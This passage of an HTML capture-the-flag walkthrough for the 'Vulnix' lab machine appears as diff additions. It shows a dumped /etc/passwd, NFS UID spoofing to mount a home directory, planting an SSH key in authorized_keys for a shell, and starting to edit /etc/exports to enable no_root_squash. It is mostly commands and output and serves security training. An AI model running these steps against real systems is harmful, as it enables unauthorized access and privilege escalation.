+                news<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>9<span style="color:#ff9d00;font-weight:700">:</span>9<span style="color:#ff9d00;font-weight:700">:</span>news<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>spool<span style="color:#ff9d00;font-weight:700">/</span>news<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                uucp<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>10<span style="color:#ff9d00;font-weight:700">:</span>10<span style="color:#ff9d00;font-weight:700">:</span>uucp<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>spool<span style="color:#ff9d00;font-weight:700">/</span>uucp<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                proxy<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>13<span style="color:#ff9d00;font-weight:700">:</span>proxy<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                www-data<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>33<span style="color:#ff9d00;font-weight:700">:</span>33<span style="color:#ff9d00;font-weight:700">:</span>www-data<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                backup<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>34<span style="color:#ff9d00;font-weight:700">:</span>34<span style="color:#ff9d00;font-weight:700">:</span>backup<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>backups<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                list<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>38<span style="color:#ff9d00;font-weight:700">:</span>38<span style="color:#ff9d00;font-weight:700">:</span>Mailing&nbsp;List&nbsp;Manager<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>list<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                irc<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>39<span style="color:#ff9d00;font-weight:700">:</span>39<span style="color:#ff9d00;font-weight:700">:</span>ircd<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>run<span style="color:#ff9d00;font-weight:700">/</span>ircd<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                gnats<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>41<span style="color:#ff9d00;font-weight:700">:</span>41<span style="color:#ff9d00;font-weight:700">:</span>Gnats&nbsp;Bug-Reporting&nbsp;System&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>admin<span style="color:#ff9d00;font-weight:700">):/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>gnats<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                nobody<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>65534<span style="color:#ff9d00;font-weight:700">:</span>65534<span style="color:#ff9d00;font-weight:700">:</span>nobody<span style="color:#ff9d00;font-weight:700">:/</span>nonexistent<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                libuuid<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>100<span style="color:#ff9d00;font-weight:700">:</span>101<span style="color:#ff9d00;font-weight:700">::/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libuuid<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
+                syslog<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>101<span style="color:#ff9d00;font-weight:700">:</span>103<span style="color:#ff9d00;font-weight:700">::/</span>home<span style="color:#ff9d00;font-weight:700">/</span>syslog<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span><br>
+                messagebus<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>102<span style="color:#ff9d00;font-weight:700">:</span>105<span style="color:#ff9d00;font-weight:700">::/</span>var<span style="color:#ff9d00;font-weight:700">/</span>run<span style="color:#ff9d00;font-weight:700">/</span>dbus<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span><br>
+                whoopsie<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>103<span style="color:#ff9d00;font-weight:700">:</span>106<span style="color:#ff9d00;font-weight:700">::/</span>nonexistent<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span><br>
+                postfix<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>104<span style="color:#ff9d00;font-weight:700">:</span>110<span style="color:#ff9d00;font-weight:700">::/</span>var<span style="color:#ff9d00;font-weight:700">/</span>spool<span style="color:#ff9d00;font-weight:700">/</span>postfix<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span><br>
+                dovecot<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>105<span style="color:#ff9d00;font-weight:700">:</span>112<span style="color:#ff9d00;font-weight:700">:</span>Dovecot&nbsp;mail&nbsp;server,,,<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>dovecot<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span><br>
+                dovenull<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>106<span style="color:#ff9d00;font-weight:700">:</span>65534<span style="color:#ff9d00;font-weight:700">:</span>Dovecot&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;user,,,<span style="color:#ff9d00;font-weight:700">:/</span>nonexistent<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span><br>
+                landscape<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>107<span style="color:#ff9d00;font-weight:700">:</span>113<span style="color:#ff9d00;font-weight:700">::/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>landscape<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span><br>
+                sshd<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>108<span style="color:#ff9d00;font-weight:700">:</span>65534<span style="color:#ff9d00;font-weight:700">::/</span>var<span style="color:#ff9d00;font-weight:700">/</span>run<span style="color:#ff9d00;font-weight:700">/</span>sshd<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>nologin<br>
+                user<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>1000<span style="color:#ff9d00;font-weight:700">:</span>1000<span style="color:#ff9d00;font-weight:700">:</span>user,,,<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span><br>
+                vulnix<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>2008<span style="color:#ff9d00;font-weight:700">:</span>2008<span style="color:#ff9d00;font-weight:700">::/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span><br>
+                statd<span style="color:#ff9d00;font-weight:700">:</span>x<span style="color:#ff9d00;font-weight:700">:</span>109<span style="color:#ff9d00;font-weight:700">:</span>65534<span style="color:#ff9d00;font-weight:700">::/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>nfs<span style="color:#ff9d00;font-weight:700">:/</span>bin<span style="color:#ff9d00;font-weight:700">/false</span>
+            </div>
+        </div><br>
+        <br>
+        This tells us vulnix's UID, which can be used to access the nfs from earlier.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) 2049/nfs round 2</strong></h2><strong><br></strong>We now know vulnix's user id (2008) from reading /etc/passwd via <code>ssh user@192.168.1.189</code><br>
+        So to access the nfs, create a user on your kali system called vulnix with a uid of 2008.<br>
+        Make a directory to mount the nfs to - <code>mkdir nfs1</code> and mount it - <code>mount 192.168.1.189:/ nfs1</code><br>
+        After switching user to vulnix - <code>su vulnix</code>, you can now read the the mounted <code>/home/vulnix</code> directory.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs#&nbsp;adduser&nbsp;--uid&nbsp;2008&nbsp;vulnix<br>
+                Adding&nbsp;user&nbsp;<span style="color:#333333;font-weight:400">`vulnix'&nbsp;...<br>
+                Adding&nbsp;new&nbsp;group&nbsp;`vulnix'&nbsp;(2008)&nbsp;...<br>
+                Adding&nbsp;new&nbsp;user&nbsp;`</span>vulnix<span style="color:#3ad900;font-weight:400">'&nbsp;(2008)&nbsp;with&nbsp;group&nbsp;`vulnix'</span>&nbsp;...<br>
+                Creating&nbsp;home&nbsp;directory&nbsp;<span style="color:#333333;font-weight:400">`/home/vulnix'&nbsp;...<br>
+                Copying&nbsp;files&nbsp;from&nbsp;`/etc/skel'&nbsp;...<br>
+                New&nbsp;password:&nbsp;</span><br>
+                <span style="color:#333333;font-weight:400">Retype&nbsp;new&nbsp;password:&nbsp;</span><br>
+                <span style="color:#333333;font-weight:400">passwd:&nbsp;password&nbsp;updated&nbsp;successfully</span><br>
+                <span style="color:#333333;font-weight:400">Changing&nbsp;the&nbsp;user&nbsp;information&nbsp;for&nbsp;test<br>
+                Enter&nbsp;the&nbsp;new&nbsp;value,&nbsp;or&nbsp;press&nbsp;ENTER&nbsp;for&nbsp;the&nbsp;default</span><br>
+                <span style="color:#333333;font-weight:400">Full&nbsp;Name&nbsp;[]:&nbsp;</span><br>
+                <span style="color:#333333;font-weight:400">Room&nbsp;Number&nbsp;[]:&nbsp;<br>
+                Work&nbsp;Phone&nbsp;[]:&nbsp;<br>
+                Home&nbsp;Phone&nbsp;[]:&nbsp;<br>
+                Other&nbsp;[]:&nbsp;<br>
+                Is&nbsp;the&nbsp;information&nbsp;correct?&nbsp;[Y/n]&nbsp;<br>
+                root@kali:~/ctf/vulnix/2049nfs#&nbsp;mkdir&nbsp;nfs1<br>
+                root@kali:~/ctf/vulnix/2049nfs#&nbsp;mount&nbsp;192.168.1.189:/&nbsp;nfs1<br>
+                root@kali:~/ctf/vulnix/2049nfs/nfs1/home#&nbsp;su&nbsp;vulnix<br>
+                vulnix@kali:/root/ctf/vulnix/2049nfs/nfs1/home$&nbsp;cd&nbsp;vulnix<br>
+                vulnix@kali:/root/ctf/vulnix/2049nfs/nfs1/home/vulnix$&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;20K<br>
+                drwxr-x---&nbsp;2&nbsp;vulnix&nbsp;vulnix&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;.<br>
+                drwxr-xr-x&nbsp;4&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Sep&nbsp;&nbsp;2&nbsp;&nbsp;2012&nbsp;..<br>
+                -rw-r--r--&nbsp;1&nbsp;vulnix&nbsp;vulnix&nbsp;&nbsp;220&nbsp;Apr&nbsp;&nbsp;3&nbsp;&nbsp;2012&nbsp;.bash_logout<br>
+                -rw-r--r--&nbsp;1&nbsp;vulnix&nbsp;vulnix&nbsp;3.5K&nbsp;Apr&nbsp;&nbsp;3&nbsp;&nbsp;2012&nbsp;.bashrc<br>
+                -rw-r--r--&nbsp;1&nbsp;vulnix&nbsp;vulnix&nbsp;&nbsp;675&nbsp;Apr&nbsp;&nbsp;3&nbsp;&nbsp;2012&nbsp;.profile</span>
+            </div>
+        </div><br>
+        <br>
+        You can get a shell as vulnix by setting up ssh.<br>
+        Create an ssh key on your attacking machine - <code>ssh-keygen</code> and <code>cat</code> the public key.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh-keygen</span><br>
+                Generating&nbsp;public<span style="color:#ff9d00;font-weight:700">/</span>private&nbsp;rsa&nbsp;key&nbsp;pair.<br>
+                Enter&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;to&nbsp;save&nbsp;the&nbsp;key&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.ssh<span style="color:#ff9d00;font-weight:700">/</span>id_rsa<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;sshVulnix<br>
+                Enter&nbsp;passphrase&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>empty&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">no</span>&nbsp;passphrase):&nbsp;hey<br>
+                Enter&nbsp;same&nbsp;passphrase&nbsp;again:&nbsp;hey<br>
+                Your&nbsp;identification&nbsp;has&nbsp;been&nbsp;saved&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;sshVulnix.<br>
+                Your&nbsp;public&nbsp;key&nbsp;has&nbsp;been&nbsp;saved&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;sshVulnix.pub.<br>
+                The&nbsp;key&nbsp;fingerprint&nbsp;is<span style="color:#ff9d00;font-weight:700">:</span><br>
+                SHA256<span style="color:#ff9d00;font-weight:700">:</span>IhuaovT<span style="color:#ff9d00;font-weight:700">/</span>OGpXBF7aYZNQsypaP<span style="color:#ff9d00;font-weight:700">/</span>o97cXpo<span style="color:#ff9d00;font-weight:700">//</span>VMYKpegs&nbsp;root@kali<br>
+                The&nbsp;keys&nbsp;randomart&nbsp;image&nbsp;is<span style="color:#ff9d00;font-weight:700">:</span><br>
+                +---[RSA&nbsp;2048]----+<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.oo.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;*o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;*.o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o.o&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;oo.o&nbsp;S&nbsp;&nbsp;o&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;o&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;ooo+&nbsp;o&nbsp;&nbsp;o&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;+<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>.oo&nbsp;.o.E..&nbsp;+&nbsp;&nbsp;&nbsp;..<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>o....o+.ooo.&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>.&nbsp;.+=+o++++oo.&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                +----[SHA256]-----+<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;sshVulnix.pub<br>
+                ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAABAQC<span style="color:#ff9d00;font-weight:700">/</span>zcPzbXDTtxus6IucqlfS7pGWG1kl8Y3q7VNzx2sdRGW+sIqRC6jOcyF32PRdOV<span style="color:#ff9d00;font-weight:700">/</span>+8fO5QNtOAAim7VVA5izpdB7iUQ1THqkfhJvZtiZ36<span style="color:#ff9d00;font-weight:700">/</span>+9zTUgpQ<span style="color:#ff9d00;font-weight:700">/</span>vYQjjTkLDomM3KykUlxktmgrxod7rD4mVUAZgezpWHpO3mQWMXzpe9ugFUnjU2ajfbHF9YrD<span style="color:#ff9d00;font-weight:700">/</span>1rBGt71nOsT4QxyAAwgCzHdRDYHBPLy3ftX<span style="color:#ff9d00;font-weight:700">/</span>aU90<span style="color:#ff9d00;font-weight:700">/</span>xJw<span style="color:#ff9d00;font-weight:700">/</span>0PuusMRrNE3v4eEWZbIqKbcEolqDCMOK5bLrog+E0KLbeSGhv9EWKTtSC4dAO8gobGvp6fISgwqxUWHW0rKoI+39PXOh7Vc7Wd4adIGd4LD&nbsp;root@kali
+            </div>
+        </div><br>
+        <br>
+        Switch user to vulnix (which you created earlier to access the nfs) and <code>cd</code> into the mounted nfs.<br>
+        Make the <code>.ssh</code> directory and echo the public key you just generated into <code>authorized_keys</code>.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;vulnix<br>
+                vulnix@kali<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span><br>
+                vulnix@kali<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix$&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;.ssh<br>
+                vulnix@kali<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;.ssh<br>
+                vulnix@kali<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>.ssh$&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAABAQC/zcPzbXDTtxus6IucqlfS7pGWG1kl8Y3q7VNzx2sdRGW+sIqRC6jOcyF32PRdOV/+8fO5QNtOAAim7VVA5izpdB7iUQ1THqkfhJvZtiZ36/+9zTUgpQ/vYQjjTkLDomM3KykUlxktmgrxod7rD4mVUAZgezpWHpO3mQWMXzpe9ugFUnjU2ajfbHF9YrD/1rBGt71nOsT4QxyAAwgCzHdRDYHBPLy3ftX/aU90/xJw/0PuusMRrNE3v4eEWZbIqKbcEolqDCMOK5bLrog+E0KLbeSGhv9EWKTtSC4dAO8gobGvp6fISgwqxUWHW0rKoI+39PXOh7Vc7Wd4adIGd4LD&nbsp;root@kali"</span>&nbsp;&gt;&nbsp;authorized_keys<br>
+                vulnix@kali<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>.ssh$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;2&nbsp;vulnix&nbsp;vulnix&nbsp;4.0K&nbsp;Apr&nbsp;13&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>17&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;vulnix&nbsp;vulnix&nbsp;4.0K&nbsp;Apr&nbsp;13&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>16&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;vulnix&nbsp;vulnix&nbsp;&nbsp;391&nbsp;Apr&nbsp;13&nbsp;02<span style="color:#ff9d00;font-weight:700">:</span>17&nbsp;authorized_keys<br>
+            </div>
+        </div><br>
+        <br>
+        Switch user back to root and navigate to where the the ssh key is saved.<br>
+            <div class="codebox">
+                vulnix@kali<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>.ssh$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;root<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>2049nfs<span style="color:#ff9d00;font-weight:700">/</span>nfs1<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>.ssh#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix<span style="color:#ff9d00;font-weight:700">/</span>
+            </div>
+        </div><br>
+        <br>
+        And log in using the key!<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>vulnix#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;-i&nbsp;sshVulnix&nbsp;vulnix@192.168.1.189<br>
+                Enter&nbsp;passphrase&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">key</span>&nbsp;'sshVulnix':&nbsp;hey<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;12.04.1&nbsp;LTS&nbsp;(GNU/Linux&nbsp;3.2.0-29-generic-pae&nbsp;i686)<br>
+                ...<br>
+                vulnix@vulnix:~$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) /etc/exports</strong></h2><br>
+        See what vulnix can do:<br>
+            <div class="codebox">
+                vulnix@vulnix<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;-l<br>
+                Matching&nbsp;<span style="color:#3ad900;font-weight:400">'Defaults'</span>&nbsp;entries&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">vulnix</span>&nbsp;on&nbsp;this&nbsp;host:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;env_reset,&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br>
+                <br>
+                User&nbsp;vulnix&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;this&nbsp;host:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(root)&nbsp;sudoedit&nbsp;/etc/exports,&nbsp;(root)&nbsp;NOPASSWD:&nbsp;sudoedit&nbsp;/etc/exports
+            </div>
+        </div><br>
+        <br>
+        /etc/exports is the config file of the nfs, which we we can edit using <code>sudoedit /etc/exports</code><br>
+        Edit the file to read <em>no_root_squash</em>, meaning that now we'll be able to access the nfs as root.<br>
+            <div class="codebox">
+                vulnix@vulnix<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;sudoedit&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>exports<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;/etc/exports:&nbsp;the&nbsp;access&nbsp;control&nbsp;list&nbsp;for&nbsp;filesystems&nbsp;which&nbsp;may&nbsp;be&nbsp;exported</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to&nbsp;NFS&nbsp;clients.&nbsp;&nbsp;See&nbsp;exports(5).</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Example&nbsp;for&nbsp;NFSv2&nbsp;and&nbsp;NFSv3:</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;/srv/homes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hostname1(rw,sync,no_subtree_check)&nbsp;hostname2(ro,sync,no_subtree_check)</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Example&nbsp;for&nbsp;NFSv4:</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;/srv/nfs4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;/srv/nfs4/homes&nbsp;&nbsp;gss/krb5i(rw,sync,no_subtree_check)</span><br>
+                <span style="color:#0088ff;font-weight:400">#</span><br>
